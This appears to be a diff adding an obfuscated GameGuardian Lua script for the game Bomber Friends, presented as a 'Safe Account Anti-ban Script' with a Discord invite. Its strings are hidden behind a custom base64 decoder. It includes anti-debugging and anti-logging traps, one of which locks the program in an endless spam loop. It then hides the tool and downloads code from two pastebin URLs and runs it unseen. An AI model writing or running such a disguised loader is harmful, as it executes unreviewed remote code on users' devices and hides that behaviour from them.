@@ -1,0 +1,88 @@
+Tx=((((15-10)-3)/((14-9)-(5-2)))*((7-4)-(620-(555+64))))+30;Kt=(((935-(857+74))-(570-(367+201)))/(937-(214+713)))*Tx;xj=(12*(2+3))+(((98+525)-((1432-(282+595))+64))*Kt);zk=(933-((2494-(1523+114))+67+7))*xj
+local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+function hqTDKTNFpojeXJSoSNcLZkWdrOWNLjPMDwvgkTxo(data) m=string.sub(data,0,(Tx*Kt/Tx)/(zk/3)+(zk*1/2)) data=data:gsub(m,'')
+
+data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end
+
+local info = gg.getTargetInfo()
+
+local FakePath = hqTDKTNFpojeXJSoSNcLZkWdrOWNLjPMDwvgkTxo('gbKcsUhyeqvDVyNJvYUwfjyFWAnRKeiMQdWtvekBHPCOANsQsrIFizkWEOtBL3NkY2FyZC9BTlRJX1lPU0VG')
+function gg.getFile()
+return FakePath
+end
+local pret = hqTDKTNFpojeXJSoSNcLZkWdrOWNLjPMDwvgkTxo('VpnKZplVzRQYQvbeCvNuftgKoYyiONIScvaoMUykQGtStgFhXltKRuhLnGgtZnVuY3Rpb246IEA=')..gg.getFile()..hqTDKTNFpojeXJSoSNcLZkWdrOWNLjPMDwvgkTxo('KGeUeVofPUpSBlwZEfJAakIqPUrJIdHEoHTRVjWkWUMjvyzioZVEjGQiIisQOjItNA==')
+local cc = string.match(pret, hqTDKTNFpojeXJSoSNcLZkWdrOWNLjPMDwvgkTxo('pzXfuqGOTQTjgQJoWrVPUxtjAlorSMEpMIUSQfZzmEkgcQZhBnUxENCFuyHSQCguKyk6'))
+if gg.getFile() ~= cc or #FakePath ~= #cc then 
+return gg.alert(hqTDKTNFpojeXJSoSNcLZkWdrOWNLjPMDwvgkTxo('aBJqcyfjJlIpXpsevBqYAjtCbsfvOdBvMBDZTYwdovcKfdTfVVOesfnnAmGcQW50aUxvZyAx'))
+elseif #tostring(gg.getFile()) ~= #FakePath then
+return gg.alert(hqTDKTNFpojeXJSoSNcLZkWdrOWNLjPMDwvgkTxo('GXKyfEKCPzASppdbiKPiLAVvQNCJqogmvHZwDMMIpiQJblPLQKIWSmVQeKkxQW50aUxvZyAy'))
+end
+local test = hqTDKTNFpojeXJSoSNcLZkWdrOWNLjPMDwvgkTxo('UeDkwFvMKXQWoPENpToeQotqLZFoJXpyqTvNMHvwRiTVONwkkKgnYaAhzUCL')
+y = 0
+repeat
+y = y + 1
+test = test .. hqTDKTNFpojeXJSoSNcLZkWdrOWNLjPMDwvgkTxo('DbnPHmpyKkqXNBnpyyGqYOVuKdMUiLRHaHVXNbULfkiOhWxaVuOaJmnEgNwEMA==')
+until y == 999
+if tostring(string.sub) == tostring(string.rep) or (test ~= (hqTDKTNFpojeXJSoSNcLZkWdrOWNLjPMDwvgkTxo('JxzkUKXPupwpOzrNcLbcXSfrYLrbFmucnqtxCOZbYxrWOLBneNvGgiojVYWIMA==')):rep(999)) then
+return gg.alert(hqTDKTNFpojeXJSoSNcLZkWdrOWNLjPMDwvgkTxo('mdZFhnACjpOnsjZXLVsUllCfSSvFhqVPUKosFCrCTbgbpVAKGyonTWBPBjdYQW50aUxvZw=='))
+else
+local _time = os.clock()
+local Spam = (function ()
+_sptext = (hqTDKTNFpojeXJSoSNcLZkWdrOWNLjPMDwvgkTxo('DrvkNmLjSTNnuBFdYQczmCcxTHkcNWIhZWKZaXThWfzPSShNfEwopmFhhFeJMDAwMA==')):rep(99999)
+for i = 1,200 do
+debug.getinfo(6795,nil,_sptext)
+end
+end)
+Spam()
+local L1_0 = string.format(hqTDKTNFpojeXJSoSNcLZkWdrOWNLjPMDwvgkTxo('qGUjSGVueeQuHiAdjwhzcMVvPBqQxLYGlfIhpHTaLBQtPxwXxwbjpawuxTKNJWY='), os.clock() - _time)
+local _clock = tonumber(L1_0)
+if _clock > 0.100 then 
+gg.alert(hqTDKTNFpojeXJSoSNcLZkWdrOWNLjPMDwvgkTxo('bvAKOfbnOeNktCrEjVpXASeIICbLThUZchWAiGzzMwenFNaeQRHwmEBANLLQTG9nID8='))
+while true do
+Spam()
+end
+end
+end
+
+while pcall(load(hqTDKTNFpojeXJSoSNcLZkWdrOWNLjPMDwvgkTxo('MaIylzhrQBfzsYqxfnAJTfIeerihPPUNMmEMEoMxUyzawcQiPvUHlWzAxyUYb3MuZXhpdCgp'))) or not tostring(os.exit):find(hqTDKTNFpojeXJSoSNcLZkWdrOWNLjPMDwvgkTxo('LElFJIkHjlHNoXfJDRVtpaWifvnFFNTJbTPDGdKaGQcjoImVtfNMiVBIWJJxZ2clLmV4aXQ=')) do gg.alert(hqTDKTNFpojeXJSoSNcLZkWdrOWNLjPMDwvgkTxo('mSulzFQklvMjgWQWVbuJChnTeTCYmuMXhyvFMKIXauEYXJTiTfMOKYAGyjMAQmxvY2sgR0cgTG9nZ2Vy')) end
+
+if not info.packageName:find(hqTDKTNFpojeXJSoSNcLZkWdrOWNLjPMDwvgkTxo('intkRWLPWofVzXVThHEgKHnhNdaFnOTjVYcCELcGhVuSjeOMuTNjNUsbGkmaXmNvbSUuaHlwZXJrYW5p')) then
+    local confirm = gg.alert(
+        hqTDKTNFpojeXJSoSNcLZkWdrOWNLjPMDwvgkTxo('hyFmvskMRLAIWRuzeDWkIRoewhuSqQQHWlGIPTLUVIzokGGNbMBSsHyeHythQXJlIHlvdSBzdXJlIHlvdSBhcmUgcnVubmluZyB0aGlzIG9uIHRoZSBjb3JyZWN0IEJvbWJlciBGcmllbmRzPw=='),
+        hqTDKTNFpojeXJSoSNcLZkWdrOWNLjPMDwvgkTxo('GgXdjKvEgfrEjUWQJiEGKwcnAdIgmdlsMgnaIsNTwffnayZkguLwhGHBHQyHWWVz'), hqTDKTNFpojeXJSoSNcLZkWdrOWNLjPMDwvgkTxo('dSvsaitzgeLpLOUuVoIsrhIbeBSyckKmlOQOSRSszDtyhfbRvrTXgQSFASURTm8=')
+    )
+    if confirm == nil or confirm == 2 then
+    print(hqTDKTNFpojeXJSoSNcLZkWdrOWNLjPMDwvgkTxo('vCIEdesBefWXwPtmShjLUSVGuReBvkSnehlakFjuNJOScCBScSqDhRxPCaNDWW91IHNob3VsZCBib21iZXIgZnJpZW5kcw=='))
+        os.exit()
+    end
+end
+
+local Starting_test = gg.alert(
+    hqTDKTNFpojeXJSoSNcLZkWdrOWNLjPMDwvgkTxo('NNCRjlSMYeoMGLXaLlzFRTICvnEBUAqVxRXbxCiulPXoSyBHphsECIBFjTxW8J+boe+4j1NhZmUgQWNjb3VudCBBbnRpLWJhbiBTY3JpcHTwn5uh77iPXG5cbuKdpO+4j0pvaW4gbXkgRGlzY29yZCBTZXJ2ZXLinaTvuI9cbmh0dHBzOi8vZGlzY29yZC5nZy9ENHV0cFBuYw=='),
+    hqTDKTNFpojeXJSoSNcLZkWdrOWNLjPMDwvgkTxo('WtRYtFQhVYyXCFcHDzWlOUyMCeAzBMzdfTIWSwCfAGTaoZZzZebPIlltkTSvQ29weQ=='), nil, hqTDKTNFpojeXJSoSNcLZkWdrOWNLjPMDwvgkTxo('wCAgMYCempsApSvraQtWMDOikHMdwCwnAMjuhhMvIZNBOSKsRRfsFxuVJvnqU2tpcA==')
+)
+if Starting_test == 1 then
+    gg.copyText(hqTDKTNFpojeXJSoSNcLZkWdrOWNLjPMDwvgkTxo('rhwYivzEhHRnXtjzueuPqtNVTVuVIeIhelAotZMvNCmmaCnkqGdgUofEsRMzaHR0cHM6Ly9kaXNjb3JkLmdnL0Q0dXRwUG5j'))
+    gg.toast(hqTDKTNFpojeXJSoSNcLZkWdrOWNLjPMDwvgkTxo('YfCjEXScMYXKeExTPwzJYXzgRVbRIFbROFeujwkAexaJxPcoHPdAbnlpfGhETGluayBjb3BpZWQgdG8gY2xpcGJvYXJkIQ=='))
+end
+
+gg.setVisible(false)
+
+local function fetchAndRunScript(pastebinURL)
+    local response = gg.makeRequest(pastebinURL)
+    if response and response.content then
+        local chunk, errorMsg = load(response.content)
+        if chunk then
+            chunk()
+        else
+            gg.alert(hqTDKTNFpojeXJSoSNcLZkWdrOWNLjPMDwvgkTxo('HuzggeveczdfTbLgoHbouMIZseFhHeYuQtEolBjoMsDyqjdPZAoUDNXAeocIRXJyb3IhIEZhaWxlZCB0byBsb2FkIHNjcmlwdDog') .. errorMsg)
+            os.exit()
+        end
+    else
+        gg.alert(hqTDKTNFpojeXJSoSNcLZkWdrOWNLjPMDwvgkTxo('CvemlRPAKSZJUjKYodtMRPwVHXGtzOQLppodoaoWBwhDyEuQVMhWAlKnbMmBRXJyb3IhIEZhaWxlZCB0byBmZXRjaCB0aGUgc2NyaXB0LiBDaGVjayB5b3VyIGNvbm5lY3Rpb24u'))
+        os.exit()
+    end
+end
+
+fetchAndRunScript(hqTDKTNFpojeXJSoSNcLZkWdrOWNLjPMDwvgkTxo('RZIcpytVLoapbmlIJHALpznSmpkxXbdxmIJefFXIzDQcDdnqUJAohvnYElpwaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3LzhUd2N6dVNq'))
+fetchAndRunScript(hqTDKTNFpojeXJSoSNcLZkWdrOWNLjPMDwvgkTxo('ZEqfGvzsSMBmBfEFOWKlVTqiJRMbSVZZiZxIlCVYrVAJcyJegYAENeRZXECEaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1pRWnhESlNp'))    
